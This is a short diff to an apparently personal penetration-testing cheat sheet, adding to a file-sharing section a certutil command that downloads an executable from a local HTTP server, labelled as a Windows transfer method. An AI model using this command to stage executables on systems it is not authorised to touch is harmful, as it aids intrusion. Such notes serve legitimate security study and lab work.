@@ -18,6 +18,7 @@
 > cd OpenSharingFolder<br/>
 > python3 -m http.server 8000<br/>
 > Open VM, navigate to http://192.168.0.101:8000<br/>
+> certutil -urlcache -f http://192.168.0.101:8000/file.exe file.exe    | Windows Transfer
 
 
 ## NMAP
